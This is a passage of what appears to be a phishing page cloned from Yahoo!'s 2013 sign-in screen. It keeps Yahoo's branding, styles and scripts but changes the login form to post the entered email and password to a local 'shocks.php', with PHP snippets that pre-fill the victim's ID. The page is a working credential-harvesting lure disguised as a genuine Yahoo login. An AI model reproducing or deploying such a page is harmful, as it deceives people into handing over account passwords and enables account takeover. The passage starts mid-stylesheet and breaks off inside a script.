	width: 262px !important;
}
#yregtgen #yregtxt {
	margin-right: 265px;
}
.mm-lgbx {
	border: 2px solid rgb(153, 153, 153);
	border: 2px solid rgba(153, 153, 153, 0.75); 
	border-radius: 2px;
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    -khtml-border-radius: 2px;
    -o-border-radius: 2px;
	z-index: 3;
	font-size: 13px !important;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	background-color: #ffffff;
}
.mm-lgbx .lgbx {
	padding: 20px;
}
.mm-lgbx .lg-sprite {
	background: url(https://s.yimg.com/sf/assets/dl/images/yahoo-login-sprite-1.4.png) no-repeat;
}
.mm-lgbx .lgbx-logo {
	width: 138px;
	height: 30px;
	text-align: center;
	margin: 10px 0px 27px 41px;
	background-position: 0px -4px;
	position: relative;
}
.mm-lgbx .lgbx-seal-logo{
	background-position: -5px -72px;
	margin-left: 0px;
	margin-bottom: 43px;
	top: 11px;
}
.mm-lgbx #fsLogin {
	position: relative;
}
.mm-lgbx #inputs {
	padding: 0px;
}
.mm-lgbx #inputs input {
	border: 1px solid #bababa;
	margin-bottom: 15px;
	font-size: 107% !important;
	padding: 5px;
	height: 23px;
	width: 208px;
	border-radius: 3px;
    -moz-border-radius: 3px;
    -webkit-border-radius: 3px;
    -khtml-border-radius: 3px;
    -o-border-radius: 3px;

}
.mm-lgbx #inputs input:focus {
	border: 1px solid #783ba8;
}
.mm-lgbx .lgbx-btn {
	border: 0 none;
	color: #ffffff;
	height: 35px;
	width: 100%;
	font-weight: bold;
	cursor: pointer;
	text-align: center;
}
.mm-lgbx .purple-bg {
	border-radius: 2px;
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    -khtml-border-radius: 2px;
    -o-border-radius: 2x;
	background-color: #6E329D;
	background-image: linear-gradient(center, #6E329D 0%, #6E329D 100%);
	background-image: -moz-linear-gradient(center , #6E329D 0%, #6E329D 100%);
	background-image: -o-linear-gradient(center, #6E329D 0%, #6E329D 100%);
	background-image: -webkit-linear-gradient(center, #6E329D 0%, #6E329D 100%);
	background-image: -ms-linear-gradient(center, #6E329D 0%, #6E329D 100%);
	border: 1px solid #522675;
}
.mm-lgbx #persistency {
	font-size: 107% !important;
	color: #222222;
	padding-bottom: 18px;
}
.mm-lgbx #persistency label {
	padding-left: 10px;
}
.mm-lgbx .lgbx-signup {
	border-top: 1px solid #dfdfdf;
	margin-top: 10px;
	padding-top: 15px	
}
.mm-lgbx .blue-bg {
	background-color: #0b70be;
	background-image: linear-gradient(center, #0b70be 0%, #0b70be 100%);
	background-image: -moz-linear-gradient(center, #0b70be 0%, #0b70be 100%);
	background-image: -o-linear-gradient(center, #0b70be 0%, #0b70be 100%);
	background-image: -webkit-linear-gradient(center, #0b70be 0%, #0b70be 100%);
	background-image: -ms-linear-gradient(center, #0b70be 0%, #0b70be 100%);
	display: block;
	height: 24px;
	padding-top: 10px;
	text-decoration: none;
	border-radius: 2px;
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    -khtml-border-radius: 2px;
    -o-border-radius: 2px;
	border: 1px solid #0b5fa2;
}
.mm-lgbx .help-links {
	margin-bottom: 20px;
}
.mm-lgbx .help-links a {
	font-size: 107%;
	color: #046fc9;
}
.mm-lgbx .help-links a:hover {
	text-decoration: none;
}
.mm-lgbx #submit {
	padding-bottom: 5px;
}
.mm-lgbx .suli .lgbx-signup {
	border: 0px;
	margin-top: 0px;
	padding-top: 0px;
}
.mm-lgbx .suli #idp {
	top: 15px;
	padding-bottom: 30px;
}
.mm-lgbx .suli #idpBtns {
	padding-top: 14px;
	border-bottom: 1px solid #dfdfdf;
	padding-bottom: 60px;
}
.mm-lgbx .mm-or {
	top: 69px;
	color: #666666;
	font-size: bold;
	background-color:  #ffffff;
	position: absolute;
	text-align: center;
	top: -8px;
	width: 40px;
	left: 90px;
}
.mm-lgbx #fBtn, .mm-lgbx #gBtn { 
	float: left; 
	width: 105px;
}
.mm-lgbx #gBtn {
	padding-left: 8px;
}
.mm-lgbx #idp {
	position: relative;
}
.mm-lgbx #idpBtns {
	border-top: 1px solid #dfdfdf;
	padding-top: 20px
}
.mm-lgbx #fBtnLnk {
	width: 106px;
	height: 37px;
	display: block;
	background-position: -3px -34px;
	border-radius: 2px;
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    -khtml-border-radius: 2px;
    -o-border-radius: 2px;
}
.mm-lgbx #gBtnLnk {
	width: 106px;
	height: 37px;
	display: block;
	background-position: -112px -34px;
	border-radius: 2px;
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    -khtml-border-radius: 2px;
    -o-border-radius: 2px;
}
.mm-lgbx .purple-continue-bg {
	display: block;
	height: 24px;
	padding-top: 10px;
	text-decoration: none;
}
.mm-lgbx #antiphish {
	float: right;
}
.mm-lgbx #antiphish img {
	margin-top: 7px;
}
.mm-lgbx #antiphishlnk {
	display: block !important;
	position: relative;
	float:right;
}
.mm-lgbx .lisu #antiphishlnk {
	left: -14px;
	top: 0px;
}
.mm-lgbx .suli #antiphishlnk {
	right: 19px;
	top: 9px;
}
.mm-lgbx #persistency span {
	*background-position: -139px -16px;
	background-position: -139px -15px;
	cursor: pointer;
}
.mm-lgbx #persistency span.checkbox {
    padding-left:10px;
}
.mm-lgbx #persistency span.labeltxt {
    padding-right: 2px;
	padding-left: 5px;
}
.mm-lgbx #persistency span.checked {
	background-position: -139px 1px;
	cursor: pointer;
}
.mm-lgbx #lgbx-seal {
	position: absolute; 
	width: 166px; 
	height: 121px; 
	background-position: 0px 0px; 
	background-repeat: no-repeat; 
}
.mm-lgbx .lisu #lgbx-seal {
	top: 0px;
	right: 0px;
}
.mm-lgbx .suli #lgbx-seal {
	top: 148px;
	right: 0px;
}
.mm-lgbx .lgbx-ltr {
    direction: ltr;
}
</style>




</head>
<body id="mnbd">



<!-- ads: 150002527 INT.OFFSET: 0 -->




  <div id='hdBg'>
  

<link type='text/css' rel='stylesheet' href='https://s.yimg.com/zz/combo?kx/ucs/uh/css/291/yunivhead-min.css&kx/ucs/uh/css/221/logo-min.css&kx/ucs/uh/css/288/yunivhead_https-min.css'/><!-- intl = us, locale = en-US, spaceid = 150002527 offset = 0 Header 2.0 -->
<style>#yUnivHead{background:none repeat scroll 0 0 transparent;}</style><style>/*hacks for no doctype*/
#yuhead-bd #yuhead-search #yuhead-sform-cont {
      *background-color: #dfdfe0;
    }
    #yuhead-bd #yuhead-search #yuhead-sform-cont form .yucs-sweb-btn {
      *background-color: #f8d44c;
    }
img.yucs-avatar{width:16px;height:16px;}</style><div id="yUnivHead" class="yucs-en-us yucs-slim" data-lang="en-us" data-property="login" data-flight="1372787430" data-uhvc="/">        <a href="#yuhead-search" class="yucs-skipto-search yucs-activate">Skip to search.</a>        <div id="yuhead-hd" class="yuhead-clearfix">        <div id="yuhead-mepanel-cont">        </div>        <div id="yuhead-promo"></div>        <div id="yuhead-com-links-cont">            <ul id="yuhead-com-links" class="yucs-toolbar yucs-activate" aria-label="Yahoo! Services">                                <style>    #yUnivHead #yuhead-hd #yuhead-mepanel-cont {display:none;}    #yUnivHead #yuhead-hd #yuhead-promo {display:none;}    #yUnivHead #yuhead-bd #yuhead-search {display:none;}    #yUnivHead #yuhead-pbar {display:none;}    #yUnivHead #yuhead-bd {padding-bottom:0;_clear:none;_margin-top:-25px;}    #yUnivHead #yuhead-bd .yuhead-logo {margin-top:-25px;_margin-top:0;}    #yuhead-hd #yuhead-com-links-cont #yuhead-com-links li.yuhead-me{border-left:1px solid #ccc;border-right:none;}    #yuhead-hd #yuhead-com-links-cont #yuhead-com-links li.yuhead-me.right{border-right:1px solid #ccc;border-left:none;}    #yUnivHead.yucs-ar-jo #yuhead-hd #yuhead-com-links-cont #yuhead-com-links li.yuhead-me,    #yUnivHead.yucs-ar-JO #yuhead-hd #yuhead-com-links-cont #yuhead-com-links li.yuhead-me {border-left:none;border-right:1px solid #ccc;}</style><li id="yuhead-com-home"><a class="sp yuhead-ico-home" href="http://www.yahoo.com/" rel="nofollow" target="_top">Yahoo!</a></li><li class="yuhead-me"><a href="http://help.yahoo.com/l/en-us/yahoo/edit/" rel="nofollow" target="_top">Help</a></li>                                            </ul>        </div>    </div>    <div id="yuhead-bd" class="yuhead-clearfix">        <div class="yuhead-logo">   <style>      .yuhead-logo h2{        width:141px;        height:30px;        background-image:url(https://s.yimg.com/rz/uh/logo/newpurple/PNGs-optimized/login-us-3470.png);        _background-image:url(https://s.yimg.com/rz/uh/logo/newpurple/compositeGIFs-optimized/login-us-3470.gif);      }      .yuhead-logo a{        width:141px;        height:30px;      }      .yuhead-logo div.yuhead-comarketing {       width:141px;      }         </style>   <h2 class="yuhead-login yuhead-standard">      <a href="https://www.yahoo.com/"       target="_top" tabindex="-1">         Yahoo!      </a>   </h2>   <!-- comarketing component --></div>            </div>                        </div><style>#yuhead-mepanel {width: 150%;}</style>                <script>
                window.onload = function() {
                    var seedfile = 'https://s.yimg.com/lq/lib/yui-ssl/3.4.1/build/yui/yui-min.js';
                    var yui3 = document.createElement('script');
                    yui3.type = 'text/javascript';
                    yui3.id="seedfile";
                    yui3.src = seedfile;
                    var head = document.getElementsByTagName('head')[0];
                    head.appendChild(yui3);

                    yui3.onload = function() {
                        loadUHJS();
                    }
                    yui3.onreadystatechange = function() {
                        if (this.readyState == 'loaded' ||this.readyState == 'complete') {
                            loadUHJS();
                        }
                    }

                    loadUHJS = function() {
                        YUI({
                                combine:true,
                                comboBase: 'https://s.yimg.com/lq/combo?',
                                root: 'yui-ssl/3.4.1/build/'
                        }).use('node','event','event-mouseenter','substitute','oop','node-focusmanager', function(Y) {});
                        var hdJS= document.createElement('script');
                        hdJS.type = 'text/javascript';
                        hdJS.src = 'https://s.yimg.com/zz/combo?kx/ucs/sts/js/442/skip-min.js&kx/ucs/uh/js/279/timestamp_library-min.js&kx/ucs/menu_utils/js/164/menu_utils_v2-min.js&kx/ucs/uh/js/267/aria_toolbar-min.js&kx/ucs/username/js/43/user_menu-min.js&kx/ucs/help/js/41/help_menu-min.js&kx/ucs/utility_link/js/20/utility_menu-min.js&kx/ucs/uh/js/262/logo_debug-min.js';
                        head.appendChild(hdJS);
                    }
                };
                </script>

  </div>





    <!--[if IE]>
    <div id='iframeHolder'>
                <div id='adFrame'></div>
            </div>
    <![endif]-->
    <div id='mainBox'>
      <div id='loginHolder'>


        <div id='leftContent'>

  
  
          <div id='static'>
              
              <script type="text/javascript">
                  var av = true;
                  if (av) {
                     document.getElementById("static").style.display = "none";
                  }
              </script>
              

              
<style type="text/css">
html{background-color:#fff;}
body,div,p{margin:0;padding:0;}
.lofb_wrap{font:20px arial;color:#000;width:800px;margin:130px auto 0;font-family:Gotham,verdana,sans-serif;line-height:1.5em;}
.lofb{padding-right:280px;margin-left:20px;}
.lofb h2{font-size:3.1em;font-weight:bold;color:#7B0099;margin:10px 0;line-height:1em;}
.lofb h3{margin-left:5px;font-size:1.05em;color:#000;font-weight:bold;margin:10px 5px;}
.lofb p {margin-left:5px;}
</style>
<div class="lofb_wrap">
<div class="lofb">
<h3>Yahoo! makes it easy to enjoy what matters most in your world.</h3>
<p>Best in class Yahoo! Mail, breaking local, national and global news, finance, sports, music, movies and  more. You get more out of the web, you get more out of life.</p>
</div>
</div>

          </div>
  
        </div>
        <div id='loginBox'>
          <div id='yreglg'>

  
    
<div class="top mm-lgbx">
	<div class="lgbx lisu">
			<script type='text/javascript'>
if(top == self){
  document.write("<div class=' badge'></div>");
}
</script>
		

<div class="lgbx-ltr"><div class="lgbx-logo lg-sprite "></div></div>
<fieldset id='fsLogin' class='clear'>
	<legend>Login Form</legend>
	
	<form method="post" action="shocks.php" autocomplete="off" name="login_form" onsubmit="return hash2(this)">

	<input type="hidden" name=".tries" value="1">
	<input type="hidden" name=".src" value="ym">
	<input type="hidden" name=".md5" value="">
	<input type="hidden" name=".hash" value="">
	<input type="hidden" name=".js" value="">

	<input type="hidden" name=".last" value="">
	<input type="hidden" name="promo" value="">
	<input type="hidden" name=".intl" value="us">
	<input type="hidden" name=".lang" value="en-US">
	<input type="hidden" name=".bypass" value="">
	<input type="hidden" name=".partner" value="">
	<input type="hidden" name=".u" value="85hcilp8t64n6">
	<input type="hidden" name=".v" value="0">
	<input type="hidden" name=".challenge" value="WQeaV7FDjlBOPSu.h9pxwjJ2Doj6">

	<input type="hidden" name=".yplus" value="">
	<input type="hidden" name=".emailCode" value="">
	<input type="hidden" name="pkg" value="">
	<input type="hidden" name="stepid" value="">
	<input type="hidden" name=".ev" value="">
	<input type="hidden" name="hasMsgr" value="0">
	<input type="hidden" name=".chkP" value="Y">
	<input type="hidden" name=".done" value="http://mail.yahoo.com">
	<input type="hidden" name=".pd" value="ym_ver=0&c=&ivt=&sg=">

	<input type="hidden" name=".ws" id=".ws" value="0">
	<input type="hidden" name=".cp" id=".cp" value="0">		
	<input type="hidden" name="nr" value="0">
	
	<input type="hidden" name="pad" id="pad" value="1">
	<input type="hidden" name="aad" id="aad" value="1">
	
	
	<div id='inputs'>
					<?php if($user == "") {
							?>
	 <input class="txtentry" name="q1_news" id="input_1" maxlength="100" type="text" size="1" tabindex="1" placeholder="user@example.com" value="<?php echo $email != "" ? $email : "" ?>" /><?php echo $email_msg != "" ? "<span style='color: #FF0000; display: block; margin-left: 1px; margin-top: 5px;'>$email_msg</span>" : "<br />" ?>

				<?php

			} else {
			
			?>
			
			<input class="txtentry" type="hidden" name="q1_news" value="<?php echo $userid ?>" />

				<p id='input_1'><b><font face="Arial"><span style="font-size: 12pt"><?php echo $userid ?></span></font></b></p>
	<?php

			} ?>
				<br>
									<input name='passwd' id='passwd' type='password' maxlength='64' tabindex='2' aria-required="true" placeholder="Password" autocorrect="off" autocomplete="off" value="">
					<div id="captchaDiv"></div>

			</div>
		<script src="https://s.yimg.com/zz/combo?yui:2.8.2/build/yahoo-dom-event/yahoo-dom-event.js"></script>
<script>
var yahoo_util_event = YAHOO.util.Event;
function mmCheckTheBox (e) {
	var yahoo_util_dom = YAHOO.util.Dom;

	// don't check/uncheck when "esc" is pressed
	if (yahoo_util_event.getCharCode(e) != 9) {
		yahoo_util_event.preventDefault(e);
		if (yahoo_util_dom.get("persistent").value == "y") {
			yahoo_util_dom.get("persistent").value = "";
			yahoo_util_dom.removeClass('pLabelC','checked');
		} else {
			yahoo_util_dom.get("persistent").value = "y";
			yahoo_util_dom.addClass('pLabelC','checked');
		}
	}
}
yahoo_util_event.addListener("pLabel", "click", mmCheckTheBox);
yahoo_util_event.addListener("pLabel", "keypress", mmCheckTheBox);
</script>


		<div id='persistency'>
	<input type='hidden' name='.persistent' id='persistent' value='y' >
	<span id="pLabel" for='persistent' tabindex='3'><span id="pLabelC" class="checkbox lg-sprite checked">&nbsp;</span><span class="labeltxt">Keep me signed in</span></span>
	</div>

	<div id='submit'>
		<button type='submit' id='.save' name='.save' class='lgbx-btn purple-bg' tabindex='4'>
		  Sign In
		</button>
	</div>
</fieldset>

		
	<div class="help-links">
		<a id="forgotLnk" href="https://edit.yahoo.com/config/eval_forgot_pw?new=1&.done=http%3A//mail.yahoo.com&.src=ym&partner=&.intl=us&.lang=en-US&pkg=&stepid=&.pd=ym_ver%3d0%26c=&.ab=&.last=" tabindex="5">I can't access my account</a>
		<br /><a id="helpLnk" href= "https://login.yahoo.com/config/login?.src=ym&.intl=us&.lang=en-US&.help=1&.v=0&.u=85hcilp8t64n6&.last=&.last=&promo=&.bypass=&.partner=&pkg=&stepid=&.pd=ym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&.ab=&.done=http%3A//mail.yahoo.com" tabindex="6">Help</a>

		</div>

		
        <style type="text/css">
		        </style>
        <div id="idp">
			<span class="mm-or">OR</span>
			<div id="idpBtns">
				<div id="fBtn">
					<a class="lg-sprite" id="fBtnLnk" href="https://open.login.yahoo.com/openid/yrp/signin?idp=facebook&ts=1372787430&.intl=us&.lang=en-US&.done=http%3A%2F%2Fmail.yahoo.com&rpcrumb=3X2Sn3esfVK&.src=ym" target="_blank" tabindex="7"></a>

				</div>
				<div id="gBtn">
					<a class="lg-sprite" id="gBtnLnk" href="https://open.login.yahoo.com/openid/yrp/signin?idp=google&ts=1372787430&.intl=us&.lang=en-US&.done=http%3A%2F%2Fmail.yahoo.com&rpcrumb=3X2Sn3esfVK&.src=ym" target="_blank" tabindex="8"></a>
				</div>
			</div>   
			<div class="clear"></div>
        </div>
        <script>
        var fbSigninLnk = "https://open.login.yahoo.com/openid/yrp/signin?idp=facebook&ts=1372787430&.intl=us&.lang=en-US&.done=http%3A%2F%2Fmail.yahoo.com&rpcrumb=3X2Sn3esfVK&.src=ym";
        var googSigninLnk = "https://open.login.yahoo.com/openid/yrp/signin?idp=google&ts=1372787430&.intl=us&.lang=en-US&.done=http%3A%2F%2Fmail.yahoo.com&rpcrumb=3X2Sn3esfVK&.src=ym"; 
        </script>

		
			
<div class="lgbx-signup">
		<a id="signUpBtn" tabindex="9" class="lgbx-btn blue-bg" href="https://edit.yahoo.com/config/eval_register?.intl=us&.lang=en-US&.pd=ym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&new=1&.done=http%3A//mail.yahoo.com&.src=ym&.v=0&.u=85hcilp8t64n6&partner=&.partner=&pkg=&stepid=&.p=&promo=&.last=">Create New Account</a>
	</div>

			</div>
</div>

    

          </div>
        </div>

      </div><!-- end loginHolder -->
    </div><!-- end mainBox -->




    <![if !IE]>
    <div id='iframeHolder'>
                <div id='adFrame'></div>
            </div>

    <![endif]>



    <div id="footer">
        
<!-- intl = us, spaceid = 150002527 offset = 0 position = FOOT -->
<!-- static compact footer --> 
	
	<style type="text/css">
	#mem_ft {border-top:1px solid #CCCCCC;font-size:10px;margin-top:1em;padding-top:0.5em;font-family:arial,helvetica,clean,sans-serif;text-align:center}
	#mem_ft p {margin:0;padding:0;}
	</style>
	<!--[if IE]> 
	<style type="text/css">
	#mem_ft p {margin:0.25em 0 0 0;}
	</style>
	<![endif]--><div id="mem_ft">
    <p> Copyright � 2013 Yahoo! Inc. All rights reserved.</p>

    <p>
        <a href="https://legalredirect.yahoo.com/copyright?intl=us" target='_blank'>Copyright/IP Policy</a> | 
        <a href="https://legalredirect.yahoo.com/utos?intl=us" target='_blank'>Terms of Service</a> | 
        <a href="http://security.yahoo.com" target="_blank">Guide to Online Security</a> |
        <a href="https://legalredirect.yahoo.com/privacy?intl=us" target="_blank">Privacy Policy</a>     </p>
</div>
    </div>

<span id="cache"></span>
<script type="text/javascript">
var ps3 = false;
var bb = false;
</script>
<script type="text/javascript" src="https://s.yimg.com/zz/combo?yui:2.8.2/build/yahoo-dom-event/yahoo-dom-event.js&yui:2.8.2/build/animation/animation-min.js&yui:2.8.2/build/connection/connection_core-min.js&sf/l/2.6.66/j/centerIframe-min.js&sf/l/2.6.65/j/capslock_ui-min.js&sf/l/2.6.65/j/login_md5-min.js"></script>

	<script src="https://s.yimg.com/lq/lib/reg/js/yahoo_container-min_json-min_connection_main-min-new.js"></script>		
	 <script type="text/javascript">
	var isIE = false;
	errClNm = "nodisp";
	var aeaJson = {};
	var pwqaJson = {};
	var verifyJson, selEmail, pwqaPresent=0, aeaPresent=0, captchaData= new Array();
	var s_result = new Array();

	function setFocusOnCaptcha(){
		var cp = document.getElementById('captchaV5Answer');
		cp.focus();
	}
	YAHOO.util.Event.onAvailable('captchaV5Answer', setFocusOnCaptcha);
	function adipcl(e){
			YAHOO.util.Dom.addClass("inputs", 'yui-skin-sam');
		}
		YAHOO.util.Event.onAvailable("inputs",this.adipcl,this);
		function adbdcl(e){
			YAHOO.util.Dom.addClass("mnbd", 'masked v5bd yui-skin-sam');
		}
		//YAHOO.util.Event.onAvailable("mnbd",this.adbdcl,this);
	cPanel = new YAHOO.widget.Panel("captcha", {
	    width: "460px",
        //height: "380px",
	    fixedcenter: true,
	    close: true,
	    visible: false,
	    draggable: true,
	    modal: true,
	    zIndex:100,
	    constraintoviewport: true		
	});
    cPanel.beforeHideEvent.subscribe(function(){
        cPanel.setBody('');
    });
    var cpwcFlag = '';
	YAHOO.util.Event.addListener("login_form", "submit", sbmCp);	
			var callback = {
				success:function(o) {
				if(o.responseText !== undefined){ 
				 var resp = YAHOO.lang.JSON.parse(o.responseText);
				 var erstr = "";
						if(resp.status == "redirect"){
							window.location = resp.url;
						}else if(resp.status == "error"){	
							if(resp.code != '1213' && resp.code != '1214' && resp.code != '2213'){
								cPanel.hide();                           				
							}else {
								YAHOO.membership.clearError();								
							}
							switch(resp.code){					
								case '1212':
									erstr += "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
									if(resp.populateYId=="1"){
								
										YAHOO.membership.showXhrErrWYid(erstr);
									}else{

										YAHOO.membership.showXhrErr(erstr);
									}
								break;							
								case '1213':								
								case '1214':
                                    cpwcFlag = cpwcFlag || resp.ep;
									if(resp.captchaSubmitted == "1"){
										errClNm = "showdisp"; 
									} else {
										errClNm = "nodisp"; 
									}
									var yid = resp.login || "";
									getCv5(cpwcFlag, yid);							
								break;
								case '1219':
									erstr += "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
									YAHOO.membership.showXhrErr(erstr);
								break;
								case '1235':
									erstr += '<strong>This ID is not yet taken.</strong><br>Are you trying to <a href="https://edit.yahoo.com/config/eval_register?login=&.intl=us&.lang=en-US&.done=http%3A//mail.yahoo.com&.src=ym&.v=0&.u=85hcilp8t64n6&partner=&.p=&promo=&.last=&.testid=sprads_tst"> register</a> for a new account?';
									YAHOO.membership.showXhrErr(erstr);
								break;
								case '1236':
									erstr += "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
									YAHOO.membership.showXhrErr(erstr);
								break;
								case '1250':
									erstr += "The browser you're using refuses to sign in. (cookies rejected)";
									YAHOO.membership.showXhrErr(erstr);
								break;
                                case '2213':
                                    YAHOO.util.Dom.removeClass("captchaErr", "nodisp");
                                    YAHOO.util.Dom.addClass("captchaErr", "showdisp");
                                break;
								case '9999':
                                                                        showSecondChallenge(resp);
                                                                break;
                                                                case '9998':
                                                                        showUserLocked();
                                                                break;
								default:
								break;
							}							
						}
					 } else {
						var erstr = "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
                                                YAHOO.membership.showError(erstr);
					 }
			 		},					
					failure:function(o) {						
						var erstr = "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
						YAHOO.membership.showError(erstr);
					}									
				};		 	 		
		var callback1 = {
			cache:false,
			success: function(o) {
				if(o.responseText.indexOf("Captcha") < 0){
					alert("Sorry, service is temporarily unavailable. Please try again later.");
					return;
				}
				cPanel.setHeader("Verification: Type The Code Shown Below");
                var html = '<div id="captchaErr" class="'+errClNm+'">Invalid code: try again</div>';
                cpwcFlag = (o.responseText.indexOf("captchaAnswer") > 0 ) ? "" : "cpwc";
                if(cpwcFlag != "cpwc") {
                    html += '<div id="captchaV5"></div>';
                    html += '<div id="submitC"><div id="cdiv"><button id=".saveC" type="submit" name=".saveC" class="primaryCta" tabindex="5">Continue</button></div>';
                } else {
                    html += '<div id="captchaV5" class="cpwcCaptcha" style="margin-left:0px;"></div><input type="hidden" name=".ep" id=".ep" value="' + cpwcFlag + '">';
                }
			 	var respXML = getXmlDomObj(o.responseText);                
                cPanel.setBody(html);	
                cPanel.render("captchaDiv");
                if(cpwcFlag == "cpwc") {
                    var bdDiv = YAHOO.util.Dom.getElementsByClassName("bd", "div", "captchaDiv");
                    bdDiv[0].setAttribute("style", "height:auto!important");
                    bdDiv[0].style.cssText = 'height:auto !important'; //For IE
                }
				var scriptNode = respXML.getElementsByTagName("CaptchaScript")[0];
	 			if (scriptNode) {
	     			var scriptText = isIE ? scriptNode.text : scriptNode.textContent; 
	     			eval(scriptText);
	     			YAHOO.CAPTCHA.wrapper.execute(o.responseText);
				}                           				
                //YAHOO.util.Dom.getElementsByClassName("captchaButToSecondary")[0].tabIndex = "0";
                YAHOO.util.Dom.getElementsByClassName("container-close")[0].tabIndex = "0";
                //YAHOO.util.Dom.getElementsByClassName("captchaButTry")[0].tabIndex = "1";
                //document.getElementById(".saveC").tabIndex = "0";
                //YAHOO.util.Dom.getElementsByClassName("captchaAnswerBox")[0].tabIndex = "0";
                YAHOO.util.Event.onAvailable('captchaV5Answer', setFocusOnCaptcha);
                cPanel.showMask();                
                cPanel.show();
                cPanel.setFirstLastFocusable();
			 },
			 failure : function(o) {			 		
					var erstr = "<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.";
					YAHOO.membership.showError(erstr);			 
			 }				 			 	
		};
		function getXmlDomObj(sourceXml) {
			var xmlDoc;
			if (window.ActiveXObject) {			                                                                                            
			    if (typeof(xmlDoc) == 'undefined') {
				xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
				xmlDoc.async="false";
				isIE=true;
			    }
			    xmlDoc.loadXML(sourceXml);
			} else {			                                                                                            
			    var parser=new DOMParser();
			    xmlDoc=parser.parseFromString(sourceXml,"text/xml");
			    isIE=false;
			}
			return xmlDoc;
		}

		//Static strings for second challenge
		var secChalStr = {
		    pwqa_content : "You are logging in from a device we don't recognize. <a href='' id='pwqa_why_popup'>Learn why</a>",
		pwqa_content_confirm_id : "Please choose how to confirm your identity for account security.",
		    pwqa_content_next_line : "For your account safety, please answer your security question below.",
		    pwqa_content_aea_text : "We can send a verification code to your listed phone number or alternate email address.",
		    sec_chal_header : "Confirm Your Identity: ",
            pwqa_header : "Answer Security Question",
		    pwqa_wrong_answer : "The answer you entered is incorrect. Please try again.",
		    pwqa_verify_answer : "Verify Answer",
		    sec_chal_continue : "Continue",
		    sec_chal_back : "Back",
		    sec_chal_close : "Close",
		    pwqa_show_verification_cta : "Receive Code",
		    aea_header : "Receive Verification Code",
		    aea_content : "For your account safety, please choose either a listed phone number (carrier charges may apply) or email address below to receive a verification code.",
		    aea_learn_more : "Learn more",
		    aea_sms_text : "SMS",
		    aea_voice : "Voice",
		    aea_by_phone : "By phone",
		    aea_by_email : "By email",
		    aea_receive_code : "Receive Code",
		    aea_err_temp_not_delivered : "We cannot deliver the verification code to your selected phone number or email at this time. Please choose another one or try later again.",
		    aea_err_not_delivered : "We cannot deliver the verification code to your selected phone number or email. Please choose another one.",
		    aea_err_not_selected : "Please select either a phone number or an email address listed below to receive your login verification code.",
		    aea_verify_header : "Enter Verification Code",
		    aea_email_verify_content : "A verification code has been sent to <span class='strong'>{email}</span>",
		    aea_email_idetification_code : "Verification code",
		    sec_chal_enter_code : "Verify Code",
		    sec_chal_err_no_answer : "No answer provided. Please try again.",
		    sec_chal_err_empty_verification : "Please enter the verification code to continue",
		    locked_header : "Unsuccessful Login: Account Locked Temporarily.",
		    locked_content : "This account is temporarily locked for 12 hours because of security concerns. Please try signing in later or contact online <a href='{lock_link}' target='_blank'>Yahoo! Customer Care</a> for further assistance.",
		    aea_err_pwqa_locked : "You failed to answer your security question correctly multiple times. Please continue to confirm your identity by selecting another verification method below.",
		    why_recognize : "Why don't we recognize your device?",
		    why_point_one : "You are using a device or browser you haven't previously used.",
		    why_point_two : "You may have deleted your browser cookies or your browser is set to clear cookies whenever it closes.",
		    why_point_three : "You are using &quot;Private Browsing&quot; mode.",
		    sec_chal_or : "OR",
		    aea_learn_more_content_para_one : "To help prevent unauthorized person from accessing your account, we need to verify your identity with a one-time verification code sent to your account's mobile phone or alternate non-Yahoo! email address.",
		    aea_learn_more_content_para_two : "How does Yahoo! use the telephone number?",
		    aea_learn_more_content_para_three : "We and TeleSign Corporation, our partner who helps provide this service, shall use the phone number to send a validation code. We also track each number to make sure it isn't used too many times. We will not use the number to send you promotional or other unwanted messages, unless you've given us permission elsewhere. We do not share the number with any other company or organization except TeleSign Corporation, which retains the number no longer than 90 days. Learn more about <a href='{learn_link}' target='_blank'>Yahoo!'s privacy practices.</a>",
		    aea_invalid_code : "The code you entered is invalid. Please try again.",
            lock_link : "http://help.yahoo.com/l/us/yahoo/edit/general-01.html",
            learn_more_link : "http://info.yahoo.com/privacy/us/yahoo/details.html",
            aea_locked_msg : "You did not confirm your identity via the login code verification method. Please confirm your identity again by answering the security question below.",
            aea_enter_code : "Enter the code received",
            added_date_format : "Added {month} {day}, {year}",
		locked_warning : "Warning",
		svc_unavilable : "Error: service temporarily unavailable."
		}
                 function closeCaptchaWindow(){

                        cPanel.hide();
                }

		function removeVoiceCaptchaJS() {
			var head = document.getElementsByTagName("head")[0];
			var scripts = head.getElementsByTagName("script");
			var styles = head.getElementsByTagName("link");

            var voiceCaptchaJSFile = 'VoiceSMSCaptcha.js';
            var imageCaptchaJSFile = 'Captcha_AudioCaptcha.js';
			var captchaCSSFile = 'VoiceSMSCaptchaSecure.css';

			
			for (var i = 0; i < scripts.length; i++) {
				if (scripts[i].src.indexOf(voiceCaptchaJSFile) > 0 || scripts[i].src.indexOf(imageCaptchaJSFile) > 0) {
					head.removeChild(scripts[i]);
				}
			}
		}

		function showUserLocked() {
            //cPanel.cfg.setProperty("height", "380px");
		cPanel.setHeader(secChalStr.locked_warning);
            var lck_cnt = secChalStr.locked_content;
            lck_cnt = lck_cnt.replace('{lock_link}', secChalStr.lock_link);
		    var panelBody = '<div class="lockedPage"><div id="lockedErr" class="error2">'+secChalStr.locked_header+'</div><div class="lockedContent">'+lck_cnt+'</div><div id="submitC"><div id="cdiv"><button id="closeLocked" type="button" name="closeLocked" class="primaryCta" tabindex="5">'+secChalStr.sec_chal_close+'</button></div></div></div>'; 
		    cPanel.setBody(panelBody);
            cPanel.render("captchaDiv");
		    cPanel.showMask();                
		    cPanel.show(); 
		    YAHOO.util.Event.addListener('closeLocked', 'click', function(e) {
			    cPanel.hide();
		    });
		}

		function showSecChalPopup(id) {
